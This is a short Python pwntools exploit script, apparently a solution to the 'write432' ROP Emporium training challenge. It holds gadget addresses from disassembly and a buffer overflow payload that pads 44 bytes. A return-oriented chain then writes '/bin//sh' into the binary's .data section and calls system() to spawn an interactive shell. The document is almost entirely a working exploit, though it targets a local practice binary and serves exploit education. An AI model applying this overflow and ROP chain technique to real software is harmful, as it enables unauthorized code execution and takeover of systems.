from pwn import *

'''
rabin2 -S write432
25 0x00001028     8 0x0804a028     8 -rw- .data

0x08048430    1 6            sym.imp.system
08048430 <system@plt>:
 8048430:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048436:	68 18 00 00 00       	push   $0x18
 804843b:	e9 b0 ff ff ff       	jmp    80483f0 <.plt>

0x080486da: pop edi; pop ebp; ret; 
0x08048670: mov dword ptr [edi], ebp; ret; 
'''

def main():
	data_segment = 0x0804a028
	system_plt = 0x08048430
	pop_edi_ebp = 0x080486da
	mov_edi_ebp = 0x08048670

	payload = 'A' * 44

	#write /bin to ebp 4byte
	payload += p32(pop_edi_ebp)
	payload += p32(data_segment)
	payload += '/bin'
	payload += p32(mov_edi_ebp)

	#write //sh to ebp+4
	payload += p32(pop_edi_ebp)
	payload += p32(data_segment+4)
	payload += '//sh'
	payload += p32(mov_edi_ebp)

	#call system
	payload += p32(system_plt)
	payload += p32(0xdeadbeef)
	payload += p32(data_segment)

	p = process('write432')
	p.recvrepeat(0.2)
	p.sendline(payload)
	p.interactive() 

if __name__ == '__main__':
	main()
